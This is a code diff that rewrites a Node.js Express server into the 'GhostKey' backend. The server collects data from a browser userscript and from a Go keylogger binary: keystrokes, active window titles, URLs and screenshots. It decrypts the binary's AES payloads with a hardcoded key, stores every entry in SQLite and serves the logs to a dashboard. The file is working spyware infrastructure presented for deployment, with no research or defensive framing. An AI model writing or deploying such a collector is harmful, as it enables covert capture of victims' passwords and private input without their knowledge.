@@ -1,80 +1,88 @@
-const express = require("express");
-const cors = require("cors");
-const path = require("path");
+// GhostKey Backend v1.0 - Handles keys, windows, timestamps, screenshots
+// Deploy on Render: npm init -y; npm i express sqlite3 crypto-js body-parser cors
+// Run: node server.js
+
+const express = require('express');
+const sqlite3 = require('sqlite3').verbose();
+const CryptoJS = require('crypto-js');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const path = require('path');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0"; // ← MATCH YOUR GO BINARY'S KEY!
 
-// Allow all origins (you locked usage via your own script anyway)
+// Middleware
 app.use(cors());
-app.use(express.json());
+app.use(bodyParser.json({ limit: '10mb' })); // Handle big screenshot payloads
+app.use(express.static('public')); // Serve frontend files
 
-let clients = [];
-let allLogs = []; // 🔹 store all logs here in memory
-
-// ========= SSE STREAM FOR DASHBOARD =========
-app.get("/stream", (req, res) => {
-  res.setHeader("Content-Type", "text/event-stream");
-  res.setHeader("Cache-Control", "no-cache");
-  res.setHeader("Connection", "keep-alive");
-
-  clients.push(res);
-
-  req.on("close", () => {
-    clients = clients.filter(c => c !== res);
-  });
+// SQLite DB setup (stores everything)
+const db = new sqlite3.Database(':memory:'); // Use file for persistence: './logs.db'
+db.serialize(() => {
+    db.run(`CREATE TABLE logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        timestamp TEXT,
+        client TEXT,
+        window TEXT,
+        keys TEXT,
+        screenshot TEXT,
+        url TEXT
+    )`);
 });
 
-function broadcast(data) {
-  clients.forEach(res => {
-    res.write(`data: ${JSON.stringify(data)}\n\n`);
-  });
+// Decrypt function (matches Go's AES-GCM)
+function decrypt(encryptedBase64) {
+    try {
+        const encrypted = CryptoJS.enc.Base64.parse(encryptedBase64);
+        const decrypted = CryptoJS.AES.decrypt({ ciphertext: encrypted }, AES_KEY);
+        return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
+    } catch (e) {
+        console.error('Decrypt failed:', e);
+        return null;
+    }
 }
 
-// ========= HISTORY ENDPOINT (for dashboard initial load) =========
-app.get("/history", (req, res) => {
-  // You can limit if you want: e.g. last 1000
-  res.json(allLogs);
+// Original /log endpoint (for your userscript)
+app.post('/log', (req, res) => {
+    const { keys, url, sequence, timestamps, client } = req.body;
+    const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
+    const text = keys.join(''); // Simple join for display
+
+    db.run(`INSERT INTO logs (timestamp, client, window, keys, screenshot, url) VALUES (?, ?, ?, ?, ?, ?)`,
+        [ts, client, 'Browser', text, '', url]);
+
+    res.status(200).send({ success: true });
 });
 
-// ========= PRE-FLIGHT =========
-app.options("/log", (req, res) => {
-  res.sendStatus(200);
+// New /ghost endpoint (for GhostKey binary)
+app.post('/ghost', (req, res) => {
+    const { data: encrypted } = req.body;
+    const payload = decrypt(encrypted);
+
+    if (!payload) {
+        return res.status(400).send({ error: 'Decrypt failed' });
+    }
+
+    const { client, ts, win, keys, Screenshot: screenshot } = payload;
+    const keysText = Array.isArray(keys) ? keys.join('') : keys || '';
+
+    db.run(`INSERT INTO logs (timestamp, client, window, keys, screenshot, url) VALUES (?, ?, ?, ?, ?, ?)`,
+        [ts, client, win, keysText, screenshot || '', '']); // URL not in binary payload yet
+
+    console.log(`Logged: ${client} in ${win}: ${keysText.substring(0, 50)}...`);
+    res.status(200).send({ success: true });
 });
 
-// ========= POST /log – called by your Tampermonkey script =========
-app.post("/log", (req, res) => {
-  const logEntry = {
-    ...req.body,
-    serverReceivedAt: new Date().toISOString()
-  };
-
-  // Save in memory
-  allLogs.push(logEntry);
-
-  // Optional: keep memory small (e.g. last 2000 logs)
-  if (allLogs.length > 2000) {
-    allLogs = allLogs.slice(allLogs.length - 2000);
-  }
-
-  console.log("📥 Received log:", logEntry);
-
-  // Push to all connected dashboards
-  broadcast(logEntry);
-
-  res.json({ status: "ok" });
+// API to fetch logs for dashboard
+app.get('/api/logs', (req, res) => {
+    db.all(`SELECT * FROM logs ORDER BY id DESC LIMIT 50`, (err, rows) => {
+        if (err) return res.status(500).send(err);
+        res.json(rows);
+    });
 });
 
-// Optional: GET /log info
-app.get("/log", (req, res) => {
-  res.json({ message: "Use POST /log to send data." });
-});
-
-// ========= DASHBOARD PAGE =========
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "dashboard.html"));
-});
-
-const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
+    console.log(`GhostKey server running on port ${PORT}`);
 });
